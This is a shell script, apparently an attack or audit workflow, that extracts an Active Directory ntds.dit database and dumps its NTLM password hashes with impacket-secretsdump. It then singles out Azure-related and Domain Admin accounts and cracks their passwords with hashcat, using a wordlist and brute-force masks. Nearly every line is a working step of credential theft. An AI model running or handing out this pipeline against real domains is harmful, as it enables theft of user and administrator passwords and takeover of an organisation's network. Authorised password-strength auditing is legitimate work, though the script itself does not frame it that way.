sudo apt update
sudo apt install -y libesedb-utils csvtool
sudo pip install pycryptodome

# Convert AD database to searchable format
esedbexport -m tables ntds.dit
git clone https://github.com/csababarta/ntdsxtract
git --git-dir=./ntdsxtract/.git --work-tree=./ntdsxtract pull origin pull/23/head
mkdir -p ./workdir

# Dump NTLM hashes
impacket-secretsdump -system ./system -ntds ./ntds.dit LOCAL -just-dc-ntlm -outputfile user_hashes
#python2 ./ntdsxtract/dsusers.py ./ntds.dit.export/datatable.4 ./ntds.dit.export/link_table.7 ./workdir --syshive ./system --passwordhashes --ntoutfile ../nt-users --lmoutfile ../lm-users --pwdformat ophc

# Extract Azure users & hashes
python2 ./ntdsxtract/dsusers.py ./ntds.dit.export/datatable.4 ./ntds.dit.export/link_table.7 ./workdir --syshive ./system --csvoutfile ../users.csv
grep AZR\|Test ./users.csv > ./azure_users.csv
csvtool -t ';' col 2 ./azure_users.csv > ./azure_names.txt
grep -f ./azure_names.txt ./user_hashes.ntds > ./azure_hashes.txt

# Crack Azure users passwords
#rm -rf  ~/.local/share/hashcat/
sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz
hashcat -m 1000 -a 0 ./azure_hashes.txt -o ./azure_passwords.txt -O /usr/share/wordlists/rockyou.txt

# Extract Domain Admin users & hashes
python2 ./ntdsxtract/dsgroups.py ./ntds.dit.export/datatable.4 ./ntds.dit.export/link_table.7 ./workdir --name .*Dom.*Adm.* --members --csvoutfile ../domain_admins.csv
grep Person ./domain_admins.csv > ./domain_admin_users.csv
csvtool -t ';' col 7 ./domain_admin_users.csv > ./admin_names.txt
grep -f ./admin_names.txt ./user_hashes.ntds > ./admin_hashes.txt

# Crack Domain Admin passwords
hashcat -m 1000 -a 3 ./admin_hashes.txt -o ./admin_passwords.txt -O -i --increment-min=1 --increment-max=4 ?a?a?a?a
